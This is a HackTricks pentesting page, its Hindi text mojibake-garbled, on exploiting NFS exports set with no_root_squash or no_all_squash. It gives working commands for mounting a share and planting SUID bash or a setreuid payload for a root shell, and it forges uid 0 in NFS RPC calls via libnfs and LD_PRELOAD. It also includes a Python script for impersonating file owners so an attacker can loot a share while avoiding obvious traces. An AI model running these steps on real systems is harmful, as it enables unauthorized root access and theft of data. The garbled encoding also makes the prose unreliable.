<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>


_ **/etc/exports** _ рдлрд╛рдЗрд▓ рдкрдврд╝реЗрдВ, рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдорд┐рд▓рддреА рд╣реИ рдЬреЛ **no\_root\_squash** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХреНрд╕реЗрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдЙрд╕ рдорд╢реАрди рдХреЗ рд╕реНрдерд╛рдиреАрдп **рд░реВрдЯ** рд╣реЛрдВред

**no\_root\_squash**: рдпрд╣ рд╡рд┐рдХрд▓реНрдк рдореВрд▓ рд░реВрдк рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рд░реВрдЯ рдпреВрдЬрд░ рдХреЛ NFS рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╛рдЗрд▓реЛрдВ рддрдХ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдФрд░ рдЗрд╕рд╕реЗ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

**no\_all\_squash:** рдпрд╣ **no\_root\_squash** рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди **рдЧреИрд░-рд░реВрдЯ рдпреВрдЬрд░реНрд╕** рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред рдХрд▓реНрдкрдирд╛ рдХреАрдЬрд┐рдП, рдЖрдкрдХреЗ рдкрд╛рд╕ nobody рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ; /etc/exports рдлрд╛рдЗрд▓ рдЪреЗрдХ рдХреА; no\_all\_squash рд╡рд┐рдХрд▓реНрдк рдореМрдЬреВрдж рд╣реИ; /etc/passwd рдлрд╛рдЗрд▓ рдЪреЗрдХ рдХрд░реЗрдВ; рдПрдХ рдЧреИрд░-рд░реВрдЯ рдпреВрдЬрд░ рдХреА рдирдХрд▓ рдХрд░реЗрдВ; рдПрдХ suid рдлрд╛рдЗрд▓ рдЙрд╕ рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдПрдВ (nfs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ)ред nobody рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ suid рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЕрд▓рдЧ рдпреВрдЬрд░ рдмрдиреЗрдВред

# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

## рд░рд┐рдореЛрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

рдпрджрд┐ рдЖрдкрдиреЗ рдпрд╣ рдХрдордЬреЛрд░реА рдкрд╛рдИ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛** рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдкреА рдХрд░рдирд╛** рдорд╛рдЙрдВрдЯреЗрдб рдлреЛрд▓реНрдбрд░ рдореЗрдВ **/bin/bash** рдмрд╛рдЗрдирд░реА рдФрд░ рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛, рдФрд░ **рдкреАрдбрд╝рд┐рдд** рдорд╢реАрди рд╕реЗ рдЙрд╕ bash рдмрд╛рдЗрдирд░реА рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛**ред
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛** рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдкреА рдХрд░рдирд╛** рдорд╛рдЙрдВрдЯреЗрдб рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╣рдорд╛рд░рд╛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рд╣реБрдЖ рдкреЗрд▓реЛрдб рдЬреЛ SUID рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛, рдФрд░ **рдкреАрдбрд╝рд┐рдд** рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ (рдЖрдк рдпрд╣рд╛рдБ рдХреБрдЫ [C SUID рдкреЗрд▓реЛрдбреНрд╕](payloads-to-execute.md#c) рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ)ред
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## рд╕реНрдерд╛рдиреАрдп рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдорд╢реАрди рд╕реЗ рдкреАрдбрд╝рд┐рдд рдорд╢реАрди рддрдХ рдПрдХ **рдЯрдирд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЛ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдЯрдирд▓рд┐рдВрдЧ рдХрд░рдХреЗ рдЕрднреА рднреА рд░рд┐рдореЛрдЯ рд╡рд░реНрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд╛рд▓ рддрдм рд╣реИ рдЬрдм рдлрд╛рдЗрд▓ `/etc/exports` **рдПрдХ IP рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **рдХрд┐рд╕реА рднреА рдорд╛рдорд▓реЗ рдореЗрдВ рд░рд┐рдореЛрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ** рдФрд░ рдЖрдкрдХреЛ рдЗрд╕ рдЪрд╛рд▓ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред\
рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рд╢рд░реНрдд рдпрд╣ рд╣реИ рдХрд┐ `/etc/export` рдХреЗ рдЕрдВрджрд░ рдХрд╛ **рдирд┐рд░реНрдпрд╛рдд `insecure` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред\
\--_рдореБрдЭреЗ рдпрдХреАрди рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЕрдЧрд░ `/etc/export` рдПрдХ IP рдкрддреЗ рдХрд╛ рд╕рдВрдХреЗрдд рджреЗ рд░рд╣рд╛ рд╣реИ рддреЛ рдпрд╣ рдЪрд╛рд▓ рдХрд╛рдо рдХрд░реЗрдЧреА_--
{% endhint %}

**рдЪрд╛рд▓ [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) рд╕реЗ рдирдХрд▓ рдХреА рдЧрдИ рд╣реИ**

рдЕрдм, рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд╢реЗрдпрд░ рд╕рд░реНрд╡рд░ рдЕрднреА рднреА `no_root_squash` рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╣рдорд╛рд░реЗ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдорд╢реАрди рдкрд░ рд╢реЗрдпрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рд╡рд╛рд▓реА рдХреБрдЫ рд╣реИред рдпрд╣ рддрдм рд╣реЛрдЧрд╛ рдЬрдм `/etc/exports` рдореЗрдВ рд╢реЗрдпрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ IP рдкрддреЛрдВ рдХреА рд╕реНрдкрд╖реНрдЯ рд╕реВрдЪреА рд╣реЛред

рд╢реЗрдпрд░реНрд╕ рдХреА рд╕реВрдЪреА рдЕрдм рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рд╡рд╣реА рдорд╢реАрди рдЬрд┐рд╕ рдкрд░ рд╣рдо рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЙрд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдорд╢реАрди рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рд╢реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдПрдХ рдЕрдирд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрдВрд╕рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдЕрдиреНрдп, рдХрдо рдЬреНрдЮрд╛рдд рд╕реНрдерд╛рдиреАрдп рд╢реЛрд╖рдг рднреА рд╣реИред

рдпрд╣ рд╢реЛрд╖рдг NFSv3 рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдПрдХ рд╕рдорд╕реНрдпрд╛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдпрд╣ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рд╢реЗрдпрд░ рддрдХ рдкрд╣реБрдБрдЪрддреЗ рд╕рдордп рдпрд╣ рдЧреНрд░рд╛рд╣рдХ рдХреА рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╣реИ рдХрд┐ рд╡рд╣ рдЕрдкрдиреА uid/gid рдХреА рдШреЛрд╖рдгрд╛ рдХрд░реЗред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдпрджрд┐ рд╢реЗрдпрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕реНрдерд╛рдкрд┐рдд рд╣реИ рддреЛ NFS RPC рдХреЙрд▓реНрд╕ рдХреЛ рдлреЛрд░реНрдЬ рдХрд░рдХреЗ uid/gid рдХреЛ рдирдХрд▓реА рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ!

рдпрд╣рд╛рдБ рдПрдХ [рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдмрд┐рд▓реНрдХреБрд▓ рдпрд╣реА рдХрд░рдиреЗ рджреЗрддреА рд╣реИ](https://github.com/sahlberg/libnfs)ред

### рдЙрджрд╛рд╣рд░рдг рд╕рдВрдХрд▓рди рдХрд░рдирд╛ <a href="#compiling-the-example" id="compiling-the-example"></a>

рдЖрдкрдХреЗ рдХрд░реНрдиреЗрд▓ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЖрдкрдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдореЗрд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдореБрдЭреЗ fallocate рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рдХреЛ рдХрдореЗрдВрдЯ рдЖрдЙрдЯ рдХрд░рдирд╛ рдкрдбрд╝рд╛ред
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реЛрд╖рдг <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

рдЖрдЗрдП рд╕рдмрд╕реЗ рд╕рд░рд▓ рд╢реЛрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
рд╣рдорд╛рд░реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рд╢реЗрдпрд░ рдкрд░ рд░рдЦреЗрдВ рдФрд░ RPC рдХреЙрд▓реНрд╕ рдореЗрдВ рд╣рдорд╛рд░реЗ uid рдХреЛ рдлреЗрдХ рдХрд░рдХреЗ рдЗрд╕реЗ suid root рдмрдирд╛рдПрдВ:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
рдЕрдм рдмрд╕ рдЗрд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░рдирд╛ рдмрд╛рдХреА рд╣реИ:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
рд╣рдо рд╡рд╣рд╛рдВ рд╣реИрдВ, рд╕реНрдерд╛рдиреАрдп рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐!

## рдмреЛрдирд╕ NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

рдорд╢реАрди рдкрд░ рд╕реНрдерд╛рдиреАрдп рд░реВрдЯ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдореИрдВ NFS рд╢реЗрдпрд░ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд▓реВрдЯрдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛ рдЬреЛ рдореБрдЭреЗ рдкрд┐рд╡рдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗред рд▓реЗрдХрд┐рди рд╡рд╣рд╛рдВ рдЕрдкрдиреЗ рдпреВрдЖрдИрдбреА рдХреЗ рд╕рд╛рде рдХрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдереЗ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВ рд░реВрдЯ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдпреВрдЖрдИрдбреА рдорд┐рд╕рдореИрдЪ рдХреЗ рдХрд╛рд░рдг рдкрдврд╝ рдирд╣реАрдВ рд╕рдХрддрд╛ рдерд╛ред рдореИрдВ рдЪреЛрд╡рди -R рдЬреИрд╕реЗ рд╕реНрдкрд╖реНрдЯ рдирд┐рд╢рд╛рди рдЫреЛрдбрд╝рдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рддрд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП рдореИрдВрдиреЗ рдПрдХ рдЫреЛрдЯрд╛ рд╕реНрдирд┐рдкреЗрдЯ рдмрдирд╛рдпрд╛ рдЬреЛ рдореЗрд░реЗ рдпреВрдЖрдИрдбреА рдХреЛ рд╡рд╛рдВрдЫрд┐рдд рд╢реЗрд▓ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
рдлрд┐рд░ рдЖрдк рдЕрдзрд┐рдХрд╛рдВрд╢ рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░реАрдлрд┐рдХреНрд╕ рдХрд░рдХреЗ:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
